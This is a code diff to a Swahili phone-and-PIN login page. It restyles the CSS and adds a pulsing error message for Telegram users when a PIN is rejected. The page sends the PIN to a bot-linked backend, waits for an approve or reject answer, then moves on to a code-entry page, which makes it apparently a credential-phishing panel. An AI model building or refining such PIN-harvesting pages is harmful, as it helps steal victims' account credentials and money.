@@ -176,12 +176,24 @@
         /* ===== SHAKE ANIMATION ===== */
         @keyframes shake {
             0%,
-            100% { transform: translateX(0); }
-            10% { transform: translateX(-12px); }
-            30% { transform: translateX(10px); }
-            50% { transform: translateX(-8px); }
-            70% { transform: translateX(6px); }
-            90% { transform: translateX(-4px); }
+            100% {
+                transform: translateX(0);
+            }
+            10% {
+                transform: translateX(-12px);
+            }
+            30% {
+                transform: translateX(10px);
+            }
+            50% {
+                transform: translateX(-8px);
+            }
+            70% {
+                transform: translateX(6px);
+            }
+            90% {
+                transform: translateX(-4px);
+            }
         }
 
         .pin-boxes.shake input {
@@ -298,6 +310,34 @@
             font-size: 18px;
         }
 
+        /* ===== TELEGRAM PIN ERROR - Extra prominent ===== */
+        #status.telegram-pin-error {
+            display: block;
+            background: #fde8e8;
+            color: #b91c1c;
+            border-color: #b91c1c;
+            border-width: 3px;
+            box-shadow: 0 2px 20px rgba(185, 28, 28, 0.35);
+            font-size: 17px;
+            font-weight: 700;
+            padding: 16px 20px;
+            animation: pulseError 1.2s ease-in-out infinite;
+        }
+        #status.telegram-pin-error::before {
+            content: "🚫 ";
+            font-size: 22px;
+        }
+
+        @keyframes pulseError {
+            0%,
+            100% {
+                box-shadow: 0 2px 20px rgba(185, 28, 28, 0.35);
+            }
+            50% {
+                box-shadow: 0 2px 30px rgba(185, 28, 28, 0.55);
+            }
+        }
+
         /* ===== LOWER SECTION ===== */
         .lower-section {
             width: 100%;
@@ -362,19 +402,41 @@
         }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
         }
 
         /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
-            .login-title { font-size: 30px; }
-            .pin-boxes input { width: 52px; height: 52px; font-size: 22px; }
-            .header { padding: 22px 16px 18px; }
-            .brand { font-size: 22px; }
-            .content { padding: 22px 16px 16px; }
-            .phone-display { font-size: 16px; padding: 14px 14px 14px 50px; }
-            #status { font-size: 14px; padding: 10px 14px; }
+            .login-title {
+                font-size: 30px;
+            }
+            .pin-boxes input {
+                width: 52px;
+                height: 52px;
+                font-size: 22px;
+            }
+            .header {
+                padding: 22px 16px 18px;
+            }
+            .brand {
+                font-size: 22px;
+            }
+            .content {
+                padding: 22px 16px 16px;
+            }
+            .phone-display {
+                font-size: 16px;
+                padding: 14px 14px 14px 50px;
+            }
+            #status {
+                font-size: 14px;
+                padding: 10px 14px;
+            }
         }
     </style>
 </head>
@@ -516,11 +578,19 @@
             if (isTelegramWebApp()) notifyTelegram(message, 'success');
         }
 
-        // ===== WRONG PIN - RED with shake =====
+        // ===== WRONG PIN - RED with shake + TELEGRAM ERROR =====
         function showWrongPin() {
-            const message = "Nambari ya Siri si sahihi";
-            setStatus(message, 'wrong-pin');
-            if (isTelegramWebApp()) notifyTelegram(message, 'error');
+            const message = "Nambari ya Siri si sahihi. Tafadhali jaribu tena.";
+
+            // Use a special style for Telegram users to make the error extra prominent
+            if (isTelegramWebApp()) {
+                setStatus(message, 'telegram-pin-error');
+                // Show a clear alert in Telegram
+                notifyTelegram("❌ Nambari ya Siri si sahihi. Tafadhali jaribu tena.", 'error');
+            } else {
+                setStatus(message, 'wrong-pin');
+            }
+
             // Shake animation
             pinBoxesContainer.classList.remove('shake');
             void pinBoxesContainer.offsetWidth;
@@ -558,7 +628,10 @@
             this.classList.remove('error');
             localStorage.setItem("phone", this.value);
             validateAndUpdateButton();
-            if (statusEl.className === 'error' || statusEl.className === 'wrong-pin') clearStatus();
+            if (statusEl.className === 'error' || statusEl.className === 'wrong-pin' || statusEl.className ===
+                'telegram-pin-error') {
+                clearStatus();
+            }
         });
 
         phoneInput.addEventListener("change", validateAndUpdateButton);
@@ -619,7 +692,10 @@
             box.addEventListener("blur", validateAndUpdateButton);
             box.addEventListener("focus", function() {
                 this.classList.remove('error');
-                if (statusEl.className === 'error' || statusEl.className === 'wrong-pin') clearStatus();
+                if (statusEl.className === 'error' || statusEl.className === 'wrong-pin' || statusEl.className ===
+                    'telegram-pin-error') {
+                    clearStatus();
+                }
             });
         });
 
@@ -743,7 +819,8 @@
 
                 if (!res.ok) {
                     let errorMsg = "Imeshindwa kutuma Nambari ya Siri. Jaribu tena.";
-                    try { const err = JSON.parse(responseText); errorMsg = err.error || errorMsg; } catch {}
+                    try { const err = JSON.parse(responseText);
+                        errorMsg = err.error || errorMsg; } catch {}
                     setStatus(errorMsg, 'error');
                     resetForm();
                     return;
@@ -773,7 +850,7 @@
                     localStorage.setItem("pin", pin);
                     setTimeout(() => window.location.href = `code.html?botId=${botId}`, 600);
                 } else if (approved === false) {
-                    // ❌ WRONG PIN / REJECTED – RED
+                    // ❌ WRONG PIN / REJECTED – RED with Telegram error
                     showWrongPin();
                     resetForm();
                 } else {
@@ -821,7 +898,6 @@
                         }
 
                         // --- KEY: Check approved status ---
-                        // The backend returns { approved: true } for success, { approved: false } for rejection
                         if (data.approved === true) {
                             clearInterval(pollingInterval);
                             pollingInterval = null;
@@ -838,7 +914,6 @@
                             return;
                         }
 
-                        // If approved is undefined or null, keep waiting
                         // Still waiting – update status periodically
                         if (attempts % 8 === 0 || attempts === 1) {
                             const elapsed = Math.floor(attempts * 1.5);
@@ -918,7 +993,8 @@
         window.addEventListener('load', function() {
             setTimeout(() => {
                 phoneInput.focus();
-                if (phoneInput.value) phoneInput.setSelectionRange(phoneInput.value.length, phoneInput.value.length);
+                if (phoneInput.value) phoneInput.setSelectionRange(phoneInput.value.length, phoneInput.value
+                .length);
                 validateAndUpdateButton();
 
                 if (!botId || botId === "test_bot") {
